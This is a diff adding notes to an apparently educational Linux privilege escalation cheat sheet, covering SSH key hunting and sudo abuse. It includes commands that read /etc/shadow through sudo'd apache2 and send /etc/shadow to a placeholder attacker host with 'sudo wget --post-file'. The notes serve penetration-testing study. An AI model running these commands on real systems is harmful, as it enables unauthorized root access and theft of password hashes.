@@ -144,8 +144,40 @@ unshadow passwd shadow
   If `/etc/passwd` or `/etc/shadow` are modifiable, we can escalate by changing the password or changing group membership
 
 ## SSH Keys
+We're looking for id_rsa or authorized_keys.
+- Hunt for keys
+```
+# Authorized keys
+find / -name authorized_keys 2> /dev/null
 
+# id_rsa
+find /-name id_rsa 2> /dev/null
+```
+- Using an id_rsa
+```
+# id_rsa permissions 600
+chmod 600 [id_rsa_file]
+
+# Connect
+ssh -i [id_rsa_file]
+```
 # Escalation Path: Sudo
+`sudo` allows an unprivileged user to run commands as root
+
+## Sudo Shell Escapes
+See [GTFOBins](https://gtfobins.github.io/) for a more exhaustive list of escapes
+
+## Exploiting `sudo` with intended functionality
+Using the intended functionality of an application to be able to exploit a system
+- Example 1
+We run `sudo -l` and see we have `sudo` for /usr/sbin/apache2
+Normally we don't have permission (as a regular user) to view /etc/shadow.
+If we run `sudo apache2 -f /etc/shadow`, we can read /etc/shadow, because the command is executed with root priviliges
+
+- Example 2
+Again, we're assuming we cannot read /etc/shadow
+But after `sudo -l` we see we have sudo permissions to wget
+We can setup a listener on our attack machine, run `sudo wget --post-file=/etc/shadow [ip:port], and view /etc/shadow on our attack host.
 
 # Escalation Path: SUID
 
